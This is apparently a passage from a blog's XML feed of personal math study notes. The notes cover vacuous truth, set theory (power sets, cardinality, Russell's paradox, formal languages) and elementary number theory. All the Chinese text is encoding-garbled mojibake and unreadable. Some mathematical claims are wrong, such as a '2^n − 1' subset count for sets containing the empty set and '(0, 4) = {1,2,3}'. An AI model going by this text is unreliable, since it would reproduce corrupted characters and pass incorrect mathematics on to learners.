æ³•ã€å‡æ³•æ²¡æœ‰è´Ÿæ•°çš„æ¦‚å¿µï¼Œæ¯”å¦‚Bæ¬ Aåå—é’±ï¼ŒAåªä¼šè¯´â€œBï¼Œä½ æ¬ æˆ‘10å¿«é’±ï¼Œä»Šå¤©å…ˆè¿˜æˆ‘3å—é’±ï¼Œè¿™æ ·ä½ å°±åªæ¬ æˆ‘7å¿«é’±äº†ã€‚â€ï¼Œè€Œä¸ä¼šæƒ³â€œAåº”è¯¥æ”¯ä»˜B -10å—é’±â€ä½¿ç”¨è´Ÿæ•°æ¥è¡¨ç¤ºã€‚æˆ‘ä»¬ç°åœ¨å·²ç»é»˜è®¤äº†0ã€æ­£è´Ÿæ•°è®¡ç®—çš„æ¦‚å¿µï¼Œç”šè‡³å·²ç»å°†å…¶å½“ä½œäº†ç›´è§‰ï¼Œå› æ­¤å‘ç°ç›´æ¥æ­£è´Ÿæ•°è®¡ç®—å…¶å®å¾ˆæ–¹ä¾¿ç®—è´¦ã€‚å¦‚ED Forumçš„tutorsçš„æŒ‡æ­£ï¼Œ0çš„å­˜åœ¨ï¼Œä¿è¯äº†æ­£è´Ÿæ•°è®¡ç®—çš„é—­åŒ…æ“ä½œã€‚</p><p>ç©ºæ´çœŸç†å¸¸å¸¸é€‚åˆçº¯æ•°å­¦é¢†åŸŸç¡®è®¤ä¸€äº›æ¦‚å¿µçš„æé™ã€æ¨¡ç³Šé—®é¢˜ï¼Œæ”¾åœ¨ç‰©ç†ã€ç”Ÿç‰©ã€åŒ–å­¦é¢†åŸŸåè€Œå¤§æ¦‚ç‡ä¸ä¼šè¢«æ‰¿è®¤ï¼Œå¤§å®¶å…¶å®ä¹Ÿç»å¸¸å¬é—»æ•°å­¦å®¶å’Œç‰©ç†å­¦å®¶åœ¨è®¡ç®—æ–¹é¢æ˜¯å­˜åœ¨ä¸€äº›å·®å¼‚å’Œåˆ†æ­§çš„ï¼Œæ•°å­¦å®¶å¤§æ¦‚ç‡ä¹ æƒ¯åœ¨è¾¹ç•Œé—®é¢˜è¿½æ±‚å…¬å¼çš„é—­åŒ…è®¡ç®—ï¼Œç‰©ç†å­¦å®¶é€šå¸¸ä¸ä¼šè¿™ä¹ˆåšã€‚</p><p>å…¶å®åœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿç»å¸¸ç›¸ä¿¡ç©ºæ´çœŸç†ï¼Œæ— æ³•è¯å®ä½†æ˜¯å¯ä»¥æ˜¯trueçš„statementï¼Œä¸¾ä¾‹ï¼š</p><ol><li>æ— æ³•è¯æ˜å†å²æ˜¯å¦å­˜åœ¨ï¼Œä½†æ˜¯ä½ ä¼šè®¤ä¸ºå†å²äººç‰©å’Œæ•…äº‹æ˜¯çœŸå®å­˜åœ¨ï¼ˆå³trueï¼‰ï¼Œä½†æ˜¯ä½ æœ¬èº«ä¸æ´»åœ¨è¿‡å»çš„å†å²ï¼Œå› æ­¤ä½ æ— æ³•è¯å®å†å²çš„çœŸå®æ€§ï¼›</li><li>ä½ å’Œæœ‹å‹è¯´â€œæˆ‘å®¶çŒ«ä¼šåç©ºç¿»â€ï¼Œä¸è®ºä½ å®¶çœŸçš„æ²¡çŒ«ï¼Œä½ çš„æœ‹å‹ä¼šç›¸ä¿¡ï¼›</li><li>æˆ‘æœ‰è½¦ï¼Œåªä¸è¿‡ç›®å‰è½¦çš„æ•°é‡æ˜¯0ï¼›</li><li>æˆ¿é—´é‡Œæ²¡æ‰‹æœºï¼Œä½†æ˜¯ä½ å¯ä»¥å’Œé¢†å¯¼æŠ¥å‘Šâ€œæˆ¿é—´ä¸­çš„å…¨éƒ¨æ‰‹æœºå·²å…³æœºâ€ã€‚</li></ol>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Set theory</title>
      <link href="/2024/09/27/Math/Set-theory/"/>
      <url>/2024/09/27/Math/Set-theory/</url>
      
        <content type="html"><![CDATA[<p>æ—©æœŸæ•°å­¦ç¬”è®°ï¼Œå¤§é‡ä½¿ç”¨chatGPTè¾…åŠ©ï¼Œå½“æ—¶ä¸ä¼šTexï¼Œç›´æ¥æ”¾å›¾ï¼›ä¸­è‹±æ··æ‚ï¼Œä½†æ˜¯é›†åˆåŸºç¡€éƒ¨åˆ†ï¼Œä¸å†è¿›è¡Œæ•´ç†ã€‚</p><ul><li><a href="#basic-knowledge">Basic knowledge</a></li><li><a href="#definition">Definition</a></li><li><a href="#aa-">AâŠ•A= âˆ…</a></li><li><a href="#aa">AâŠ•âˆ…=A</a></li><li><a href="#cantors-paradox">Cantorâ€™s paradox</a></li><li><a href="#russells-paradox-ç½—ç´ æ‚–è®ºrussells-antinomy">Russellâ€™s paradox (ç½—ç´ æ‚–è®º)ï¼ˆRussellâ€™s antinomyï¼‰</a></li><li><a href="#power-set">power set</a></li><li><a href="#cardinality">Cardinality</a></li><li><a href="#cartesian-product">Cartesian Product</a></li><li><a href="#let-abc-be-sets-is-a-b-cabc">Let A,B,C be sets. Is A Ã—(B Ã—C)=(AÃ—B)Ã—C?</a></li><li><a href="#formal-languages-symbols">Formal Languages: symbols</a></li><li><a href="#set-operations-for-languages">Set Operations for languages</a></li><li><a href="#set-equality">Set Equality</a></li><li><a href="#laws-of-set-operations">Laws of Set Operations</a></li><li><a href="#derived-laws">Derived Laws</a></li><li><a href="#two-useful-results">Two Useful Results</a></li></ul><h1 id="Basic-knowledge"><a href="#Basic-knowledge" class="headerlink" title="Basic knowledge"></a>Basic knowledge</h1><p>formal reasoning (logic)ï¼šå½¢å¼æ¨ç†ã€é€»è¾‘æ¨ç† </p><p>A set is a collection of objects (elements). If x is an element of A we write x âˆˆ A</p><p>Elements are taken from a universe, U,â€“ but this can be quite complex, e.g. numbers, and sets of numbers, and sets of sets of numbers, etc. </p><p>Not all â€œwell-definedâ€ universes are possible, e.g. No â€œset of all setsâ€ (Cantorâ€™s paradox) No â€œsets which do not contain themselvesâ€ (Russellâ€™s paradox)</p><p>multiplicityï¼šå¤šé‡æ€§</p><p>A set is defined by the collection of its elements. Order and multiplicity of elements is not considered.</p><p>We distinguish between an element and the set comprising this single element. Thus always a!= {a}.</p><p>Set âˆ… = {} is empty (no elements);</p><p><strong>Set  { { } } is nonempty â€” it has one element</strong></p><h1 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h1><p>For sets S and T, we say S is a subset of T, written S âŠ† T, if every element of S is an element of T</p><p>Take Notice:</p><p>S âŠ†T includes the case of S = T S âŠ‚T â€”aproper subset: S âŠ† T and S=T âˆ… âŠ†S for all sets S S âŠ†U for all sets S N&gt;0 âŠ‚NâŠ‚ZâŠ‚QâŠ‚R An element of a set; and a subset of that set are two different concepts:</p><p>a âˆˆ{a,b}, a Ì¸âŠ† {a,b}; {a} âŠ† {a,b}, {a} /âˆˆ {a,b}</p><p>Take notice of such nested empty sets! they are different entity! interval notation</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-42-16.png" alt></p><p>åŒºé—´ç¬¦å·ï¼šinterval notation</p><p>Constructions from other, already defined, sets </p><p>Union (âˆª), intersection (âˆ©), complement (Â·c), set difference (), symmetric difference (âŠ•) </p><p>Power set Pow(X) = { A:A âŠ† X } </p><p>Cartesian product (Ã—)</p><p>AâˆªBâ€“union (a or b): </p><p>AâˆªB ={x :x âˆˆA or x âˆˆB}. </p><p>Aâˆ©Bâ€“intersection (a and b): </p><p>Aâˆ©B ={x :x âˆˆA and x âˆˆB}. </p><p>$A^c$ â€“ complement (with respect to a universal set U): </p><p>$A^c$ ={x : x âˆˆU and x /âˆˆ A}. </p><p>We say that A,B are disjoint if A âˆ©B = âˆ…</p><p>A\B =Aâˆ©$B^c$</p><p>symmetric difference (<strong>xor</strong>)</p><p>AâŠ•B =(A\B)âˆª(B\A)</p><h1 id="AâŠ•A-âˆ…"><a href="#AâŠ•A-âˆ…" class="headerlink" title="AâŠ•A= âˆ…"></a>AâŠ•A= âˆ…</h1><h1 id="AâŠ•âˆ…-A"><a href="#AâŠ•âˆ…-A" class="headerlink" title="AâŠ•âˆ…=A"></a>AâŠ•âˆ…=A</h1><h1 id="Cantorâ€™s-paradox"><a href="#Cantorâ€™s-paradox" class="headerlink" title="Cantorâ€™s paradox"></a>Cantorâ€™s paradox</h1><p>Proof: Assume the contrary, and let C be the largest cardinal number. Then (in the von Neumann formulation of cardinality) C is a set and therefore has a power set 2C which, by Cantorâ€™s theorem, has cardinality strictly larger than C. Demonstrating a cardinality (namely that of 2C) larger than C, which was assumed to be the greatest cardinal number, falsifies the definition of C. This contradiction establishes that such a cardinal cannot exist.</p><h1 id="Russellâ€™s-paradox-ç½—ç´ æ‚–è®º-ï¼ˆRussellâ€™s-antinomyï¼‰"><a href="#Russellâ€™s-paradox-ç½—ç´ æ‚–è®º-ï¼ˆRussellâ€™s-antinomyï¼‰" class="headerlink" title="Russellâ€™s paradox (ç½—ç´ æ‚–è®º)ï¼ˆRussellâ€™s antinomyï¼‰"></a>Russellâ€™s paradox (ç½—ç´ æ‚–è®º)ï¼ˆRussellâ€™s antinomyï¼‰</h1><p>It is a little hard to understand, Russell set wanted to contain any sets that are not belong to itself, but which leaded to the antinomy.</p><p>For better comprehension, we can use the analogies, such as The barber with â€œshaveâ€(It is a antinomy)</p><p>According to the unrestricted comprehension principle, for any sufficiently well-defined property, there is the set of all and only the objects that have that property. Let R be the set of all sets that are not members of themselves. (This set is sometimes called â€œthe Russell setâ€.) If R is not a member of itself, then its definition entails that it is a member of itself; yet, if it is a member of itself, then it is not a member of itself, since it is the set of all sets that are not members of themselves. The resulting contradiction is Russellâ€™s paradox. In symbols:</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-46-19.png" alt></p><h1 id="power-set"><a href="#power-set" class="headerlink" title="power set"></a>power set</h1><p>æ‰€æœ‰å­é›†çš„é›†åˆ</p><p>The power set of a set X, Pow(X), is the set of all subsets of X</p><p>Pow({a,b}) = { âˆ…,{a},{b},{a,b} }</p><h1 id="Cardinality"><a href="#Cardinality" class="headerlink" title="Cardinality"></a>Cardinality</h1><p>The cardinality of a set X (various notation) is the number of elements in that set.</p><p>|X| = #(X) = card(X)</p><p>Always |Pow(X)| = $2^{|X|}$</p><p>ï¼ˆä»…é€‚ç”¨äºéå•ä¸€âˆ…é›†åˆ,ä¹Ÿé€‚ç”¨äº{âˆ…}ï¼Œä½†æ˜¯ä¸é€‚ç”¨äºåªæœ‰ä¸€ä¸ªâˆ…å…ƒç´ ï¼‰</p><p>æˆ‘å†é‡æ–°è§£é‡Šä¸‹æˆ‘è‡ªå·±é¢†æ‚Ÿçš„è¿™å¥è¯ï¼Œâˆ…æ¯”è¾ƒç‰¹æ®Šï¼Œä»–çš„å­é›†å°±æ˜¯è‡ªå·±</p><p>ï¼ˆâˆ…æ˜¯ä»»ä½•é›†åˆå­é›†ï¼Œä½†æ˜¯æ²¡æœ‰å…ƒç´ ï¼‰ï¼Œä½†æ˜¯æ²¡æœ‰åŸºæ•°å…ƒç´ ï¼Œå•ç‹¬è€ƒè™‘</p><p>ä½†æ˜¯å¦‚æœè®º{âˆ…}æˆ–{a, âˆ…}ï¼Œåˆ™è¿™ä¸æ˜¯ç©ºé›†ï¼Œè¿™æ˜¯ä¸€ä¸ªéç©ºé›†åˆï¼Œæœ‰ä¸€ä¸ªç©ºé›†å…ƒç´ ï¼Œé€‚ç”¨ |pow({âˆ…})|=2^1</p><p>å¦‚æœæœ‰<code>&#123;&#125;</code>(å³<code>âˆ…</code>)ä½œä¸ºå…ƒç´ ï¼Œåˆ™åŸºæ•°æ˜¯ |2^n â€“ 1|</p><pre><code>|âˆ…| ? =0Pow(âˆ…) ? = &#123;âˆ…&#125;|Pow(âˆ…)| ? =1Pow(Pow(âˆ…)) ? = pow(&#123;âˆ…&#125;)=&#123;&#123;âˆ…&#125;, âˆ…&#125;|Pow(Pow(âˆ…))| ? =2|&#123;a&#125;| ? =1Pow(&#123;a&#125;) ? =&#123;âˆ…, a&#125;|Pow(&#123;a&#125;)| ? =2|[m, n]| ? =Pow(&#123;a,b,âˆ…&#125;)=&#123;âˆ…,&#123;a&#125;,&#123;b&#125;,&#123;âˆ…&#125;,&#123;a,b&#125;,&#123;a,âˆ…&#125;,&#123;b,âˆ…&#125;,&#123;a,b,âˆ…\&#125;\&#125;So | Pow(&#123;a,b,âˆ…&#125;)| = 2^3 = 8</code></pre><p>Relatethecardinalities to |Aâˆ©B|, |A|, |B|</p><p>|AâˆªB| = âˆ£Aâˆ£+âˆ£Bâˆ£âˆ’âˆ£Aâˆ©Bâˆ£</p><p>|A \ B| = âˆ£Aâˆ–Bâˆ£=âˆ£Aâˆ£âˆ’âˆ£Aâˆ©Bâˆ£</p><p>|AâŠ•B| = âˆ£Aâˆ£+âˆ£Bâˆ£âˆ’2âˆ£Aâˆ©Bâˆ£</p><h1 id="Cartesian-Product"><a href="#Cartesian-Product" class="headerlink" title="Cartesian Product"></a>Cartesian Product</h1><p>Notice, the <strong>cross product</strong> is <strong>orderd pairs</strong><br>(a,b) is different from (b,a)</p><p>It is similar to points, they are both ordered pairs, (a,b) is different from (b,a)</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-19.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-34.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-41.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-51-58.png" alt></p><h1 id="Let-A-B-C-be-sets-Is-A-Ã—-B-Ã—C-AÃ—B-Ã—C"><a href="#Let-A-B-C-be-sets-Is-A-Ã—-B-Ã—C-AÃ—B-Ã—C" class="headerlink" title="Let A,B,C be sets. Is A Ã—(B Ã—C)=(AÃ—B)Ã—C?"></a>Let A,B,C be sets. Is A Ã—(B Ã—C)=(AÃ—B)Ã—C?</h1><p>Of course Not.</p><p>A Ã—(B Ã—C)=(a, (b, c))</p><p>(AÃ—B)Ã—C=((a, b), c)</p><h1 id="Formal-Languages-symbols"><a href="#Formal-Languages-symbols" class="headerlink" title="Formal Languages: symbols"></a>Formal Languages: symbols</h1><p>Î£ â€”alphabet, a finite, nonempty set</p><p>Examples:</p><p>Î£={a,b,â€¦,z} for single words (in lower case)</p><p>Î£={0,1} for binary integers</p><p>Î£={0,1,â€¦,9} for decimal integers</p><p>A <strong>word</strong> is a finite string (sequence) of symbols from Î£. </p><p>The <strong>empty word</strong>, <strong>Î»</strong>, is the unique word with no symbols</p><p>Examples</p><p>w =aba, w =01101â€¦1, etc.</p><p><strong>length(w)</strong> â€” # of symbols in w </p><p>length(w) = 3,length(Î») = 0 </p><p>The only operation on words (discussed here) is <strong>concatenation</strong>, written as <strong>juxtaposition</strong> </p><p>vw,wv,wvw,vwv,â€¦</p><p>Take Notice </p><pre><code>Î»w =w =wÎ» length(vw) = length(v) + length(w)</code></pre><p>Examples </p><pre><code>Let w =abb, v = ab, u = ba vw =ababb ww =abbabb = vubb wÎ»v =abbab length(vw) = length(ababb) = 5</code></pre><p>Formal Languages: Sets of words</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-54-48.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-04.png" alt></p><p>For example, the Math language conceived :</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-30.png" alt></p><p>HTML language:</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-55-51.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-03.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-27.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-38.png" alt></p><h1 id="Set-Operations-for-languages"><a href="#Set-Operations-for-languages" class="headerlink" title="Set Operations for languages"></a>Set Operations for languages</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-56-58.png" alt></p><p>è¿™æ˜¯è¯´è¯­è¨€çš„æ“ä½œ</p><p>$\Sigma^*$ æ˜¯æ‰€æœ‰è¯­è¨€çš„çˆ¶é›†åˆï¼Œå› ä¸ºæ‹¥æœ‰â€œall finite wordsâ€</p><p>è¯­è¨€æ˜¯å…¶å­é›†</p><p>Xçš„*æ¬¡æ–¹ï¼Œæ˜¯Xè‡ªå·±å‰ä¹˜è‡ªå·±å‡ æ¬¡</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-57-47.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-57-56.png" alt></p><h1 id="Set-Equality"><a href="#Set-Equality" class="headerlink" title="Set Equality"></a>Set Equality</h1><p>Venn diagrams can help visualize, but are not rigorous.</p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-58-35.png" alt></p><p>(0, 4) = {1,2,3} = {3,2,1}</p><h1 id="Laws-of-Set-Operations"><a href="#Laws-of-Set-Operations" class="headerlink" title="Laws of Set Operations"></a>Laws of Set Operations</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-58-57.png" alt></p><h1 id="Derived-Laws"><a href="#Derived-Laws" class="headerlink" title="Derived Laws"></a>Derived Laws</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-59-24.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-14-59-30.png" alt></p><h1 id="Two-Useful-Results"><a href="#Two-Useful-Results" class="headerlink" title="Two Useful Results"></a>Two Useful Results</h1><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-19.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-33.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-00-49.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-00.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-14.png" alt></p><p><img src="/2024/09/27/Math/Set-theory/2024-10-15-15-01-29.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Number Theory</title>
      <link href="/2024/09/26/Math/Number-Theory/"/>
      <url>/2024/09/26/Math/Number-Theory/</url>
      
        <content type="html"><![CDATA[<p>æ—©æœŸæ•°å­¦ç¬”è®°ï¼Œå¤§é‡ä½¿ç”¨chatGPTè¾…åŠ©ï¼Œå½“æ—¶ä¸ä¼šTexï¼Œç›´æ¥æ”¾å›¾ï¼›ä¸­è‹±æ··æ‚ï¼Œä½†æ˜¯æ•°è®ºåŸºç¡€éƒ¨åˆ†ï¼Œä¸å†è¿›è¡Œæ•´ç†ã€‚</p><ul><li><a href="#basic-knowledge">Basic Knowledge</a></li><li><a href="#divisibility">Divisibility</a></li><li><a href="#greatest-common-divisor-and-least-common-multiple">Greatest Common Divisor and Least Common Multiple</a></li><li><a href="#euclidean-algorithm">Euclidean Algorithm</a></li><li><a href="#modular-arithmetic">Modular Arithmetic</a></li><li><a href="#æ¨¡ä½™å…¬å¼åŠè¯æ˜">æ¨¡ä½™å…¬å¼åŠè¯æ˜</a></li><li><a href="#è¯¾å ‚å°é—®é¢˜-question-on-ed-forum">è¯¾å ‚å°é—®é¢˜ Question on ED forum</a></li><li><a href="#å¤§æ•°æ±‚ä½™">å¤§æ•°æ±‚ä½™</a><ul><li><a href="#102021--7--">10^2021 % 7 = ?</a></li><li><a href="#what-is-the-last-digit-of-72023">What is the last digit of $7^{2023}$?</a></li></ul></li><li><a href="#questionn--abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a--b-cd-is-divisible-by-9">Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9</a></li><li><a href="#euclidean-algorithm-1">Euclidean Algorithm</a></li><li><a href="#proof-multiples-of-k-between-n-and-m-inclusive">Proof multiples of k between n and m (inclusive)ï¼ˆ??ï¼‰</a></li><li><a href="#gcdmnlcmmnmn">gcd(m,n)<em>lcm(m,n)=|m|</em>|n|</a></li><li><a href="#for-mn--z-if-m--n-then-gcdmn--gcdmnn">For m,n âˆˆ Z, if m > n then gcd(m,n) = gcd(mâˆ’n,n)</a></li><li><a href="#how-many-numbers-between-1-and-653-are-divisible-by-3-or-5">How many numbers between 1 and 653 are divisible by 3 or 5?</a></li><li><a href="#suppose-that-n-is-a-positive-integer-explain-why-n-and-n--1-are-coprime">Suppose that n is a positive integer. Explain why n and n + 1 are coprime.</a></li><li><a href="#find-the-last-two-digits-of-777">Find the last two digits of $7^{7^{7}}$</a></li><li><a href="#find-the-least-positive-integer-n-for-which-5n--17--16-hence-evaluate-5200--17">Find the least positive integer n for which 5n % 17 = 16. Hence, evaluate 5200 % 17.</a></li></ul><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-03-15.png" alt></p><pre><code>Real Numberã€Rã€‘-&gt; Rational #ã€Qã€‘-&gt; -&gt; æ•´æ•°ã€Zã€‘ã€å« è‡ªç„¶æ•°ã€Nã€‘ï¼ˆ0ä¸å±äºè‡ªç„¶æ•°ï¼‰ã€‘-&gt; -&gt; åˆ†æ•°ã€æœ‰é™ å’Œ æ— é™å¾ªç¯å°æ•°ã€‘-&gt; Irrational # (æ»¡è¶³æ¡ä»¶1 å°æ•° 2 æ— çº¿ä¸å¾ªç¯)</code></pre><p>Natural: {0,1,2,3,4,5,â€¦}</p><p>0æ˜¯è‡ªç„¶æ•°</p><p>ä¸Šå–æ•´å’Œä¸‹å–æ•´</p><script type="math/tex; mode=display">\left\lfloor \pi \right\rfloor = 3 = \left\lceil e \right\rceil</script><p>ä¹˜æ•°</p><ol><li>multiplier</li><li>multiplicator</li></ol><p>ä¹˜ç§¯<br>product</p><p>é™¤æ•°<br>divisor</p><p>è¢«é™¤æ•°<br>dividend</p><p>å•†<br>quotient</p><p>å¹‚<br>power</p><p>æ±‚ä½™<br>Find the remainder</p><p>æåæ ‡<br>Pol: polar coordinates</p><p>ç›´è§’åæ ‡ï¼š<br>Rec: Rectangular coordinates</p><p>å¸¦åˆ†æ•°ï¼šmixed num<br>integer part + fractional part</p><p>å‡åˆ†æ•°(improper fraction)ï¼šåˆ†å­&gt;=åˆ†æ¯</p><p>åˆ†å­ï¼šnumerator</p><p>åˆ†æ¯ï¼šdenominator</p><p>notion:æ¦‚å¿µï¼Œä¸»å¼ </p><h1 id="Divisibility"><a href="#Divisibility" class="headerlink" title="Divisibility"></a>Divisibility</h1><p>m|n</p><p>m divides n if n=k*m for some k  </p><p>1|n<br>true</p><p>-1|n<br>true</p><p>ä»»ä½•æ•°å¯ä»¥æ•´é™¤0ï¼Œä½†æ˜¯0ä¸èƒ½æ•´é™¤ä»»ä½•æ•°å­—ï¼ˆé™¤é0ï¼‰, å› ä¸ºä»»ä½•æ•°çš„0å€å°±æ˜¯0</p><p>0|n (only when n=0)<br>(notice, 0|n is False, just when n=0, it is True)</p><p>n|0<br>True<br>(Notice, 0 is anythingâ€™s product, cause the other multiplier is 0)</p><p>n|1<br>false   only when  $n=\pm 1$</p><h1 id="Greatest-Common-Divisor-and-Least-Common-Multiple"><a href="#Greatest-Common-Divisor-and-Least-Common-Multiple" class="headerlink" title="Greatest Common Divisor and Least Common Multiple"></a>Greatest Common Divisor and Least Common Multiple</h1><p>Let m,n âˆˆ Z</p><p>The <strong>greatest common divisor</strong> of m and n, gcd(m,n), is the<br>largest <strong>positive</strong> d âˆˆ Z such that d|m and d|n.</p><p>The <strong>least common multiple</strong> of m and n, lcm(m,n), is the<br>smallest <strong>positive</strong> k âˆˆ Z such that m|k and n|k.</p><p>Exception: <strong>gcd(0,0) = lcm(0,n) = lcm(m,0) = 0</strong></p><p>gcd(m,n) and lcm(m,n) are always <strong>taken as non-negative</strong> even if m or n is negative.</p><p>gcdå’Œlcmä¸æ­£è´Ÿæ•°æ— å…³ï¼Œç›´æ¥æŠŠè´Ÿå·å˜æ­£å·å³å¯ã€‚</p><p>Fact:</p><p><strong>gcd(m,n)*lcm(m,n)=|m|*|n|</strong></p><p>å¯¹æ­¤è¯æ˜ç›´æ¥æœ<br>gcd(0,n)=n<br>lcm(0,n)=0</p><h1 id="Euclidean-Algorithm"><a href="#Euclidean-Algorithm" class="headerlink" title="Euclidean Algorithm"></a>Euclidean Algorithm</h1><p>å¤§çš„æ•°å­—å‡å»å°çš„æ•°å­—ï¼Œç›´åˆ°ç›¸åŒ</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-10-21.png" alt></p><p>gcd(45,27)=gcd(18,27)=gcd(18,9)=gcd(9,9)=9</p><p>gcd(108,8)=gcd(100,8)=gcd(92,8)=â€¦=gcd(4,4)=4</p><h1 id="Modular-Arithmetic"><a href="#Modular-Arithmetic" class="headerlink" title="Modular Arithmetic"></a>Modular Arithmetic</h1><p>æ¨¡è¿ç®—</p><p>4çš„5æ¬¡æ–¹ï¼š4 to the fifth power</p><p>For $m âˆˆ Z, n âˆˆ \mathbb{Z}_{&gt;0}$   there exists q,r âˆˆ Z with 0 â‰¤ r &lt; n</p><p>such that </p><p>m=qÂ·n+r</p><script type="math/tex; mode=display">q=\left\lfloor \frac{m}{n} \right\rfloor\\r =mâˆ’qÂ·n</script><p>Let m,p âˆˆ Z, n âˆˆ Z&gt;0.</p><p>m div n = $\left\lfloor \frac{m}{n} \right\rfloor$</p><p>m % n=mâˆ’(mdivn)Â·n </p><p>m=p   | mod n  if n|(m-p)</p><h1 id="æ¨¡ä½™å…¬å¼åŠè¯æ˜"><a href="#æ¨¡ä½™å…¬å¼åŠè¯æ˜" class="headerlink" title="æ¨¡ä½™å…¬å¼åŠè¯æ˜"></a>æ¨¡ä½™å…¬å¼åŠè¯æ˜</h1><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-13-11.png" alt></p><p>å¯¹ç¬¬äºŒä¸ªè¯æ˜ï¼š</p><pre><code>proof:m%n=m-(m div n)*np%n=p-(m div n)*n=&gt;given m=p |mod nwe need to prove m%n=p%nm%n â€“ p%n = (m-p)-[(m div n) â€“ (p div n)]*n     ......(1)=&gt; n|(1)</code></pre><p>å¯¹ç¬¬å››ä¸ªè¯æ˜ï¼š</p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-15-45.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-16-19.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-16-38.png" alt></p><h1 id="è¯¾å ‚å°é—®é¢˜-Question-on-ED-forum"><a href="#è¯¾å ‚å°é—®é¢˜-Question-on-ED-forum" class="headerlink" title="è¯¾å ‚å°é—®é¢˜ Question on ED forum"></a>è¯¾å ‚å°é—®é¢˜ Question on ED forum</h1><pre><code>( a + b ) % n = ( a % n ) + ( b % n)is False, and you said( a + b ) % n =(n) ( a % n ) + ( b % n)IS CORRECT.</code></pre><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-18-19.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/my_proof.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/my_proof2.png" alt></p><p>Here is Paul Hunterâ€™s proof, he used the first principle and definition to prove the formula:</p><p><img src="/2024/09/26/Math/Number-Theory/Hunter_proof.png" alt></p><h1 id="å¤§æ•°æ±‚ä½™"><a href="#å¤§æ•°æ±‚ä½™" class="headerlink" title="å¤§æ•°æ±‚ä½™"></a>å¤§æ•°æ±‚ä½™</h1><p>å…ˆè¯´ä¸‹å¤§æ•°æ±‚ä½™ï¼Œä»1æ¬¡æ–¹å¼€å§‹å‘Næ¬¡æ–¹æ¨ï¼Œç›´åˆ°æ‰¾åˆ°ä½™æ•°ä¸º1ï¼Œåˆ™æ˜¯ä¸€ä¸ªå¾ªç¯ã€‚</p><p>å¦‚ä¸‹çš„10çš„næ¬¡æ–¹ï¼Œä»10^1ç®—åˆ°10^6%6=1ï¼Œå› ä¸ºç®—åˆ°1ï¼Œå·¦å³å†ä¹˜10^1=3 (mod 7)ï¼Œä¼šå‘ç°å°±å¼€å§‹å¾ªç¯äº†ã€‚å› æ­¤ï¼Œè¦æ‰¾åˆ°ä½™æ•°ä¸º1çš„é‚£ä¸ªæ¬¡æ–¹æ¯”å¦‚è¿™é‡Œæ˜¯6ä¸ªæ•°å‘ç°çš„ï¼Œç„¶åç›´æ¥åˆ†è§£ 2021%6=5ï¼Œç›´æ¥æ‰¾ç¬¬äº”ä¸ªæ•°ï¼ˆåŒ10^5%7ï¼‰å¾—åˆ°5</p><h2 id="10-2021-7"><a href="#10-2021-7" class="headerlink" title="10^2021 % 7 = ?"></a>10^2021 % 7 = ?</h2><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-19-29.png" alt></p><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-19-49.png" alt></p><h2 id="What-is-the-last-digit-of-7-2023"><a href="#What-is-the-last-digit-of-7-2023" class="headerlink" title="What is the last digit of $7^{2023}$?"></a>What is the last digit of $7^{2023}$?</h2><p><img src="/2024/09/26/Math/Number-Theory/2024-10-15-14-20-24.png" alt></p><h1 id="Question-n-abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a-b-c-d-is-divisible-by-9"><a href="#Question-n-abcd-is-divisible-by-9-if-and-only-if-the-digit-sum-a-b-c-d-is-divisible-by-9" class="headerlink" title="Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9"></a>Question:n = abcd is divisible by 9 if and only if the digit sum a + b +c+d is divisible by 9</h1><p>Show that the 4 digit number n = abcd is divisible by 9<br>if and only if the digit sum a + b +c+d is divisible by 